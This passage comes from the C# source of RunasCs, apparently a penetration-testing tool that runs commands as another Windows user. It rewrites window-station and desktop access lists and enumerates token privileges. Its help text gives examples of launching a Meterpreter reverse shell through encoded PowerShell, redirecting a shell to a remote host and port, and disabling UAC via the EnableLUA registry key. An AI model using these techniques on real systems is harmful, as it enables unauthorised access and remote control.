        string fqan = "";//Fully qualified account names
        byte [] Sid = null;
        uint cbSid = 0;
        StringBuilder referencedDomainName = new StringBuilder();
        uint cchReferencedDomainName = (uint)referencedDomainName.Capacity;
        SID_NAME_USE sidUse;
        int err = NO_ERROR;
        
        if(domain != "" && domain != ".")
            fqan = domain + "\\" + username;
        else
            fqan = username;
        
        if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))
        {
            err = Marshal.GetLastWin32Error();
            if (err == ERROR_INSUFFICIENT_BUFFER || err == ERROR_INVALID_FLAGS)
            {
                Sid = new byte[cbSid];
                referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
                err = NO_ERROR;
                if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))
                    err = Marshal.GetLastWin32Error();
            }
        }
        else{
            Console.Out.Write("\r\nThe username " + fqan + " has not been found.\r\n");
            Console.Out.Write("\r\nLookupAccountName failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        if (err == 0)
        {
            userSid = Marshal.AllocHGlobal((int)cbSid);
            Marshal.Copy(Sid, 0, userSid, (int)cbSid);
        }
        else{
            Console.Out.Write("\r\nThe username " + fqan + " has not been found.\r\n");
            Console.Out.Write("\r\nLookupAccountName failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        return userSid;
    }
    
    //Big thanks to Vanara project
    //https://github.com/dahall/Vanara/blob/9771eadebc874cfe876011c9d6588aefb62626d9/PInvoke/Security/AdvApi32/SecurityBaseApi.cs#L4656
    private void AddAllowedAceToDACL(IntPtr pDacl, ACCESS_MASK mask, byte aceFlags, uint aceSize){
        int offset = Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) - Marshal.SizeOf(typeof(uint));
        ACE_HEADER AceHeader = new ACE_HEADER();
        AceHeader.AceType = ACCESS_ALLOWED_ACE_TYPE;
        AceHeader.AceFlags = aceFlags;
        AceHeader.AceSize = (short)aceSize;
        IntPtr pNewAcePtr = Marshal.AllocHGlobal((int)aceSize);
        ACCESS_ALLOWED_ACE pNewAceStruct = new ACCESS_ALLOWED_ACE();
        pNewAceStruct.Header = AceHeader;
        pNewAceStruct.Mask = mask;
        Marshal.StructureToPtr(pNewAceStruct, pNewAcePtr, false);
        IntPtr sidStartPtr = new IntPtr(pNewAcePtr.ToInt64() + offset);
        if (!CopySid((uint)GetLengthSid(this.userSid), sidStartPtr, this.userSid))
        {
            Console.Out.Write("\r\nCopySid failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        if (!AddAce(pDacl, ACL_REVISION, MAXDWORD, pNewAcePtr, aceSize))
        {
            Console.Out.Write("\r\nAddAce failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        Marshal.FreeHGlobal(pNewAcePtr);
    }

    private void AddAceToWindowStation(){
        uint cbSd = 0;
        bool fDaclPresent = false;
        bool fDaclExist = false;
        IntPtr pDacl = IntPtr.Zero;
        uint cbDacl = 0;
        IntPtr pSd = IntPtr.Zero;
        IntPtr pNewSd = IntPtr.Zero;
        uint cbNewDacl = 0;
        uint cbNewAce = 0;
        IntPtr pNewDacl = IntPtr.Zero;
        
        ACL_SIZE_INFORMATION aclSizeInfo = new ACL_SIZE_INFORMATION();
        SECURITY_INFORMATION si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION;
        // Get required buffer size and allocate the SECURITY_DESCRIPTOR buffer.
        if (!GetUserObjectSecurity(this.hWinsta, ref si, pSd, 0, out cbSd))
        {
            if (Marshal.GetLastWin32Error() != ERROR_INSUFFICIENT_BUFFER)
            {
                Console.Out.Write("\r\nGetUserObjectSecurity 1 size failed with error code " + Marshal.GetLastWin32Error());
                this.CleanupHandles(-1);
            }
        }
        pSd = Marshal.AllocHGlobal((int)cbSd);
        // Obtain the security descriptor for the desktop object.
        if (!GetUserObjectSecurity(this.hWinsta, ref si, pSd, cbSd, out cbSd))
        {
            Console.Out.Write("\r\nGetUserObjectSecurity 2 failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        // Get the DACL from the security descriptor.
        if (!GetSecurityDescriptorDacl(pSd, out fDaclPresent, ref pDacl, out fDaclExist))
        {
            Console.Out.Write("\r\nGetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        // Get the size information of the DACL.
        if (pDacl == IntPtr.Zero)
        {
            cbDacl = 0;
        }
        else
        {
            if (!GetAclInformation(pDacl, ref aclSizeInfo, (uint)Marshal.SizeOf(typeof(ACL_SIZE_INFORMATION)), ACL_INFORMATION_CLASS.AclSizeInformation))
            {
                Console.Out.Write("\r\nGetAclInformation failed with error code " + Marshal.GetLastWin32Error());
                this.CleanupHandles(-1);
            }
            cbDacl = aclSizeInfo.AclBytesInUse;
        }
        
        // Allocate memory for the new security descriptor.
        pNewSd = Marshal.AllocHGlobal((int)cbSd);
        // Initialize the new security descriptor.
        if (!InitializeSecurityDescriptor(pNewSd, SECURITY_DESCRIPTOR_REVISION))
        {
            Console.Out.Write("\r\nInitializeSecurityDescriptor failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        
        // Compute the size of a DACL to be added to the new security descriptor.
        cbNewAce = (uint)Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) + (uint)GetLengthSid(this.userSid) - (uint)Marshal.SizeOf(typeof(uint));
        if(cbDacl == 0)
            cbNewDacl =  8 + (cbNewAce*2);//8 = sizeof(ACL)
        else
            cbNewDacl = cbDacl + (cbNewAce*2);

        // Allocate memory for the new DACL.
        pNewDacl = Marshal.AllocHGlobal((int)cbNewDacl);
        // Initialize the new DACL.
        if (!InitializeAcl(pNewDacl, cbNewDacl, ACL_REVISION))
        {
            Console.Out.Write("\r\nInitializeAcl failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        
        // If the original DACL is present, copy it to the new DACL.
        if (fDaclPresent)
        {
            // Copy the ACEs to the new DACL.
            for (int dwIndex = 0; dwIndex < aclSizeInfo.AceCount; dwIndex++)
            {
                IntPtr pTempAce = IntPtr.Zero;
                // Get an ACE.
                if (!GetAce(pDacl, dwIndex, out pTempAce))
                {
                    Console.Out.Write("\r\nGetAce failed with error code " + Marshal.GetLastWin32Error());
                    this.CleanupHandles(-1);
                }
                ACE_HEADER pTempAceStruct = (ACE_HEADER)Marshal.PtrToStructure(pTempAce, typeof(ACE_HEADER));
                // Add the ACE to the new ACL.
                if (!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, (uint)pTempAceStruct.AceSize))
                {
                    Console.Out.Write("\r\nAddAce failed with error code " + Marshal.GetLastWin32Error());
                    this.CleanupHandles(-1);
                }
            }
        }
        
        AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.GENERIC_ACCESS, CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE | OBJECT_INHERIT_ACE, cbNewAce);
        AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.WINSTA_ALL, NO_PROPAGATE_INHERIT_ACE, cbNewAce);
        // Assign the new DACL to the new security descriptor.
        if (!SetSecurityDescriptorDacl(pNewSd, true, pNewDacl, false))
        {
            Console.Out.Write("\r\nSetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        //  Set the new security descriptor for the desktop object.
        if (!SetUserObjectSecurity(this.hWinsta, ref si, pNewSd))
        {
            Console.Out.Write("\r\nSetUserObjectSecurity failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        
        Marshal.FreeHGlobal(pSd);
        Marshal.FreeHGlobal(pNewSd);
        Marshal.FreeHGlobal(pNewDacl);
    }
    
    private void AddAceToDesktop(){
        uint cbSd = 0;
        bool fDaclPresent = false;
        bool fDaclExist = false;
        IntPtr pDacl = IntPtr.Zero;
        uint cbDacl = 0;
        IntPtr pSd = IntPtr.Zero;
        IntPtr pNewSd = IntPtr.Zero;
        uint cbNewDacl = 0;
        uint cbNewAce = 0;
        IntPtr pNewDacl = IntPtr.Zero;
        
        ACL_SIZE_INFORMATION aclSizeInfo = new ACL_SIZE_INFORMATION();
        SECURITY_INFORMATION si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION;
        // Get required buffer size and allocate the SECURITY_DESCRIPTOR buffer.
        if (!GetUserObjectSecurity(this.hDesktop, ref si, pSd, 0, out cbSd))
        {
            if (Marshal.GetLastWin32Error() != ERROR_INSUFFICIENT_BUFFER)
            {
                Console.Out.Write("\r\nGetUserObjectSecurity 1 size failed with error code " + Marshal.GetLastWin32Error());
                this.CleanupHandles(-1);
            }
        }
        pSd = Marshal.AllocHGlobal((int)cbSd);
        // Obtain the security descriptor for the desktop object.
        if (!GetUserObjectSecurity(this.hDesktop, ref si, pSd, cbSd, out cbSd))
        {
            Console.Out.Write("\r\nGetUserObjectSecurity 2 failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        // Get the DACL from the security descriptor.
        if (!GetSecurityDescriptorDacl(pSd, out fDaclPresent, ref pDacl, out fDaclExist))
        {
            Console.Out.Write("\r\nGetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        // Get the size information of the DACL.
        if (pDacl == IntPtr.Zero)
        {
            cbDacl = 0;
        }
        else
        {
            if (!GetAclInformation(pDacl, ref aclSizeInfo, (uint)Marshal.SizeOf(typeof(ACL_SIZE_INFORMATION)), ACL_INFORMATION_CLASS.AclSizeInformation))
            {
                Console.Out.Write("\r\nGetAclInformation failed with error code " + Marshal.GetLastWin32Error());
                this.CleanupHandles(-1);
            }
            cbDacl = aclSizeInfo.AclBytesInUse;
        }
        
        // Allocate memory for the new security descriptor.
        pNewSd = Marshal.AllocHGlobal((int)cbSd);
        // Initialize the new security descriptor.
        if (!InitializeSecurityDescriptor(pNewSd, SECURITY_DESCRIPTOR_REVISION))
        {
            Console.Out.Write("\r\nInitializeSecurityDescriptor failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        
        // Compute the size of a DACL to be added to the new security descriptor.
        cbNewAce = (uint)Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) + (uint)GetLengthSid(this.userSid) - (uint)Marshal.SizeOf(typeof(uint));
        if(cbDacl == 0)
            cbNewDacl =  8 + cbNewAce;//8 = sizeof(ACL)
        else
            cbNewDacl = cbDacl + cbNewAce;

        // Allocate memory for the new DACL.
        pNewDacl = Marshal.AllocHGlobal((int)cbNewDacl);
        // Initialize the new DACL.
        if (!InitializeAcl(pNewDacl, cbNewDacl, ACL_REVISION))
        {
            Console.Out.Write("\r\nInitializeAcl failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        
        // If the original DACL is present, copy it to the new DACL.
        if (fDaclPresent)
        {
            // Copy the ACEs to the new DACL.
            for (int dwIndex = 0; dwIndex < aclSizeInfo.AceCount; dwIndex++)
            {
                IntPtr pTempAce = IntPtr.Zero;
                // Get an ACE.
                if (!GetAce(pDacl, dwIndex, out pTempAce))
                {
                    Console.Out.Write("\r\nGetAce failed with error code " + Marshal.GetLastWin32Error());
                    this.CleanupHandles(-1);
                }
                ACE_HEADER pTempAceStruct = (ACE_HEADER)Marshal.PtrToStructure(pTempAce, typeof(ACE_HEADER));
                // Add the ACE to the new ACL.
                if (!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, (uint)pTempAceStruct.AceSize))
                {
                    Console.Out.Write("\r\nAddAce failed with error code " + Marshal.GetLastWin32Error());
                    this.CleanupHandles(-1);
                }
            }
        }
        
        // Add a new ACE to the new DACL.
        if (!AddAccessAllowedAce(pNewDacl, ACL_REVISION, ACCESS_MASK.DESKTOP_ALL, this.userSid))
        {
            Console.Out.Write("\r\nAddAccessAllowedAce failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        
        // Assign the new DACL to the new security descriptor.
        if (!SetSecurityDescriptorDacl(pNewSd, true, pNewDacl, false))
        {
            Console.Out.Write("\r\nSetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        //  Set the new security descriptor for the desktop object.
        if (!SetUserObjectSecurity(this.hDesktop, ref si, pNewSd))
        {
            Console.Out.Write("\r\nSetUserObjectSecurity failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        
        Marshal.FreeHGlobal(pSd);
        Marshal.FreeHGlobal(pNewSd);
        Marshal.FreeHGlobal(pNewDacl);
    }
    

    public string AddAclToActiveWindowStation(string domain, string username){
        string lpDesktop = "";
        byte[] stationNameBytes = new byte[256];
        string stationName = "";
        uint lengthNeeded = 0;
        IntPtr hWinstaSave = GetProcessWindowStation();
        if (hWinstaSave == IntPtr.Zero)
        {
            Console.Out.Write("\r\nGetProcessWindowStation failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        if(!GetUserObjectInformation(hWinstaSave, UOI_NAME, stationNameBytes, 256, out lengthNeeded)){
            Console.Out.Write("\r\nGetUserObjectInformation failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        stationName=Encoding.Default.GetString(stationNameBytes).Substring(0, (int)lengthNeeded-1);

        this.hWinsta = OpenWindowStation(stationName, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC);
        if (this.hWinsta == IntPtr.Zero)
        {
            Console.Out.Write("\r\nOpenWindowStation failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        
        if (!SetProcessWindowStation(this.hWinsta))
        {
            Console.Out.Write("\r\nSetProcessWindowStation hWinsta failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        this.hDesktop = OpenDesktop("Default", 0, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC | ACCESS_MASK.DESKTOP_WRITEOBJECTS | ACCESS_MASK.DESKTOP_READOBJECTS);
        if (!SetProcessWindowStation(hWinstaSave))
        {
            Console.Out.Write("\r\nSetProcessWindowStation hWinstaSave failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        if (this.hWinsta == IntPtr.Zero)
        {
            Console.Out.Write("\r\nOpenDesktop failed with error code " + Marshal.GetLastWin32Error());
            this.CleanupHandles(-1);
        }
        this.userSid = GetUserSid(domain, username);
        AddAceToWindowStation();
        AddAceToDesktop();
        lpDesktop = stationName + "\\Default";
        return lpDesktop;
    }
    
    //Cleanup the handle after the spawned process run as another user has exited.
    public void CleanupHandles(int exit){
        if(this.hWinsta != IntPtr.Zero) CloseWindowStation(this.hWinsta);
        if(this.hDesktop != IntPtr.Zero) CloseDesktop(this.hDesktop);
        if(this.userSid != IntPtr.Zero) FreeSid(this.userSid);
        if(exit < 0)
            System.Environment.Exit(exit);
    }
   
}


public static class Token{
        
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool GetTokenInformation(IntPtr TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass,IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);
    
    [DllImport("advapi32.dll", SetLastError = true, CharSet=CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, StringBuilder lpName, ref int cchName );
        
    enum TOKEN_INFORMATION_CLASS{
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin
    }
    
    private struct TOKEN_PRIVILEGES {
       public int PrivilegeCount;
       [MarshalAs(UnmanagedType.ByValArray, SizeConst=64)]
       public LUID_AND_ATTRIBUTES [] Privileges;
    }
    
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    private struct LUID_AND_ATTRIBUTES {
       public LUID Luid;
       public UInt32 Attributes;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct LUID {
       public UInt32 LowPart;
       public Int32 HighPart;
    }
    
    private static string convertAttributeToString(UInt32 attribute){
        if(attribute == 0)
            return "Disabled";
        if(attribute == 1)
            return "Enabled Default";
        if(attribute == 2)
            return "Enabled";
        if(attribute == 3)
            return "Enabled|Enabled Default";
        return "Error";
    }
    
    public static List<string[]> getTokenPrivileges(IntPtr tHandle){
        List<string[]> privileges = new List<string[]>();
        uint TokenInfLength=0;
        bool Result; 
        //Get TokenInformation length in TokenInfLength
        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, TokenInfLength, out TokenInfLength);
        IntPtr TokenInformation = Marshal.AllocHGlobal((int)TokenInfLength) ;
        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, TokenInformation, TokenInfLength, out TokenInfLength) ; 
        if (Result == false){
            Console.Out.Write("\r\nGetTokenInformation failed with error code " + Marshal.GetLastWin32Error());
            System.Environment.Exit(-1);
        }
        TOKEN_PRIVILEGES TokenPrivileges = ( TOKEN_PRIVILEGES )Marshal.PtrToStructure( TokenInformation , typeof( TOKEN_PRIVILEGES ) ) ;
        for(int i=0;i<TokenPrivileges.PrivilegeCount;i++){
            StringBuilder sb = new StringBuilder();
            int luidNameLen = 0;
            LUID luid = new LUID();
            string[] privilegeStatus = new string[2];
            luid = TokenPrivileges.Privileges[i].Luid;
            IntPtr ptrLuid = Marshal.AllocHGlobal(Marshal.SizeOf(luid));
            Marshal.StructureToPtr(luid, ptrLuid, true);
            LookupPrivilegeName(null, ptrLuid, null, ref luidNameLen); // call once to get the name len
            sb.EnsureCapacity(luidNameLen + 1);
            Result = LookupPrivilegeName(null, ptrLuid, sb, ref luidNameLen);// call again to get the name
            if (Result == false){
                Console.Out.Write("\r\nLookupPrivilegeName failed with error code " + Marshal.GetLastWin32Error());
                System.Environment.Exit(-1);
            }
            privilegeStatus[0]=sb.ToString();
            privilegeStatus[1]=convertAttributeToString(TokenPrivileges.Privileges[i].Attributes);
            privileges.Add(privilegeStatus);
        }
        return privileges;
    }
}


public static class RunasCsMainClass
{
    private static string help = @"

RunasCs v1.2 - @splinter_code

RunasCs is an utility to run specific processes with different permissions than the user's current logon provides
using explicit credentials.
RunasCs has an automatic detection to determine the best create process function for every contexts.
Based on the caller token permissions, it will use one of the create process function in the following preferred order:
    1. CreateProcessAsUser();
    2. CreateProcessWithTokenW();
    3. CreateProcessWithLogonW().
The two processes (calling and called) will communicate through 1 pipe (both for stdout and stderr).
The default logon type is 3 (Network_Logon).
If you set Interactive (2) logon type you will face some UAC restriction problems.
You can make interactive logon without any restrictions by setting the following regkey to 0 and restart the server:

    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA

By default, the calling process (RunasCs) will wait until the end of the execution of the spawned process and will use
cmd.exe to manage stdout and stderr.
If you need to spawn a background or async process, i.e. spawning a reverse shell, you need to set the parameter
'process_timeout' to 0. In this case the process will be spawned without using cmd.exe and RunasCs won't
wait for the end of the execution.

Usage:
    RunasCs.exe username password cmd [domain] [process_timeout] [logon_type] 

Positional arguments:
    username                username of the user
    password                password of the user
    cmd                     command supported by cmd.exe if process_timeout>0
                            commandline for the process if process_timeout=0
Optional arguments:
    -d, --domain domain
                            domain of the user, if in a domain. 
                            Default: """"
    -f, --function int
                            CreateProcess function to use. When not specified
                            RunasCs determines an appropriate CreateProcess
                            function automatucally according to your privileges.
    -l, --logon-type logon_type
                            the logon type for the spawned process.
                            Default: ""3""
    -r, --remote host:port
                            redirect stdin, stdout and stderr to a remote host.
                            Using this options sets the process timeout to 0.
    -t, --timeout process_timeout
                            the waiting time (in ms) to use in
                            the WaitForSingleObject() function.
                            This will halt the process until the spawned
                            process ends and sent the output back to the caller.
                            If you set 0 an async process will be
                            created and no output will be retrieved.
                            If this parameter is set to 0 it won't be
                            used cmd.exe to spawn the process.
                            Default: ""120000""

Examples:
    Run a command as a specific local user
        RunasCs.exe user1 password1 whoami
    Run a command as a specific domain user
        RunasCs.exe user1 password1 whoami -d domain
    Run a command as a specific local user with interactive logon type (2)
        RunasCs.exe user1 password1 whoami -l 2
    Run a background/async process as a specific local user,
    i.e. meterpreter ps1 reverse shell
        RunasCs.exe ""user1"" ""password1"" ""%COMSPEC% powershell -enc..."" -t 0
    Redirect stdin, stdout and stderr of the specified command to a remote host
        RunasCs.exe ""user1"" ""password1"" ""%COMSPEC% powershell -enc.."" -r 10.10.10.24:4444

";
    
    private static Dictionary<int,string> logonTypes= new Dictionary<int,string>()
    {
        {2, "Interactive"},
        {3, "Network"},
        {4, "Batch"},
        {5, "Service"},
        {7, "Unlock"},
        {8, "NetworkCleartext"},
        {9, "NewCredentials"},
        {10,"RemoteInteractive"},
        {11,"CachedInteractive"}
    };

    private static Dictionary<int,string> createProcessFunctions= new Dictionary<int,string>()
    {
        {0, "CreateProcessAsUser"},
        {1, "CreateProcessWithTokenW"},
        {2, "CreateProcessWithLogonW"}
    };

    private static bool HelpRequired(string param)
    {
        return param == "-h" || param == "--help" || param == "/?";
    }
    
    private static uint ValidateProcessTimeout(string timeout)
    {
        uint processTimeout = 120000;
        try {
            processTimeout = Convert.ToUInt32(timeout);
        }
        catch {
            Console.Out.WriteLine("[-] RunasCs: Invalid process_timeout value: " + timeout);
            System.Environment.Exit(-1);
        }
        return processTimeout;
    }

    private static string[] ValidateRemote(string remote)
    {
        string[] split = remote.Split(':');
        if( split.Length != 2 ) {
            Console.Out.WriteLine("[-] RunasCs: Invalid remote value: " + remote);
            Console.Out.WriteLine("[-] Expected format: 'host:port'");
            System.Environment.Exit(-1);
        }
        return split;
    }
    
    private static int ValidateLogonType(string type)
    {
        int logonType = 3;

        try {
            logonType = Convert.ToInt32(type);
            if( !logonTypes.ContainsKey(logonType) ) {
                throw new System.ArgumentException("");
            }
        }
        catch {
            Console.Out.WriteLine("[-] RunasCs: Invalid logon_type value: " + type);
            Console.Out.WriteLine("[-] Allowed values are:");
            foreach(KeyValuePair<int,string> item in logonTypes) {
                Console.Out.WriteLine(String.Format("[-]     {0}\t{1}", item.Key, item.Value));
            }
            System.Environment.Exit(-1);
        }
        return logonType;
    }
    
    private static int ValidateCreateProcessFunction(string function)
    {
        int createProcessFunction = 2;
        try {
            createProcessFunction = Convert.ToInt32(function);
            if( createProcessFunction < 0 || createProcessFunction > 2 ) {
                throw new System.ArgumentException("");
            }
        }
        catch {
            Console.Out.WriteLine("[-] RunasCs: Invalid createProcess function: " + function);
            Console.Out.WriteLine("[-] Allowed values are:");
            foreach(KeyValuePair<int,string> item in createProcessFunctions) {
                Console.Out.WriteLine(String.Format("[-]     {0}\t{1}", item.Key, item.Value));
            }
            System.Environment.Exit(-1);
        }
        return createProcessFunction;
    }

    private static int DefaultCreateProcessFunction()
    {
        int createProcessFunction = 2;
        IntPtr currentTokenHandle = System.Security.Principal.WindowsIdentity.GetCurrent().Token;        

        List<string[]> privs = new List<string[]>();
        privs = Token.getTokenPrivileges(currentTokenHandle);

        bool SeIncreaseQuotaPrivilegeAssigned = false;
        bool SeAssignPrimaryTokenPrivilegeAssigned = false;
        bool SeImpersonatePrivilegeAssigned = false;

        foreach (string[] s in privs)
        {
            string privilege = s[0];
            if(privilege == "SeIncreaseQuotaPrivilege")
                SeIncreaseQuotaPrivilegeAssigned = true;
            if(privilege == "SeAssignPrimaryTokenPrivilege")
                SeAssignPrimaryTokenPrivilegeAssigned = true;
            if(privilege == "SeImpersonatePrivilege")
                SeImpersonatePrivilegeAssigned = true;
        }
        if (SeIncreaseQuotaPrivilegeAssigned && SeAssignPrimaryTokenPrivilegeAssigned)
            createProcessFunction = 0;
        else 
            if (SeImpersonatePrivilegeAssigned)
                createProcessFunction = 1;

        return createProcessFunction;
    }

    public static string RunasCsMain(string[] args)
    {
        string output = "";
        if (args.Length == 1 && HelpRequired(args[0]))
        {
            Console.Out.Write(help);
            System.Environment.Exit(0);
        }

        List<string> positionals = new List<string>();
        string username, password, cmd, domain;
        username = password = cmd = domain = string.Empty;
        string[] remote = null;
        uint processTimeout = 120000;
        int logonType = 3, createProcessFunction = DefaultCreateProcessFunction();

        try {
            for(int ctr = 0; ctr < args.Length; ctr++) {
                switch (args[ctr])
                {

                    case "-d":
                    case "--domain":
                        domain = args[++ctr];
                        break;

                    case "-t":
                    case "--timeout":
                        processTimeout = ValidateProcessTimeout(args[++ctr]);
                        break;

                    case "-l":
                    case "--logon-type":
                        logonType = ValidateLogonType(args[++ctr]);
                        break;

                    case "-f":
                    case "--function":
                        createProcessFunction = ValidateCreateProcessFunction(args[++ctr]);
                        break;

                    case "-r":
                    case "--remote":
                        remote = ValidateRemote(args[++ctr]);
                        break;

                    default:
                        positionals.Add(args[ctr]);
                        break;
                }
            }
        } catch(System.IndexOutOfRangeException) {
            Console.Out.WriteLine("[-] RunasCs: Invalid arguments. Use --help for additional help.");
            System.Environment.Exit(1);
        }

        if( positionals.Count < 3 ) {
            Console.Out.WriteLine("[-] RunasCs: Not enough arguments. 3 Arguments required. Use --help for additional help.");
            System.Environment.Exit(1);
        }

        username = positionals[0];
        password = positionals[1];
        cmd = positionals[2];

        if( remote != null ) {
            processTimeout = 0;
        }

        output=RunasCs.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote);
        return output;
    }
}

class MainClass{
    static void Main(string[] args)
    {
        Console.Out.Write(RunasCsMainClass.RunasCsMain(args));
    }
}
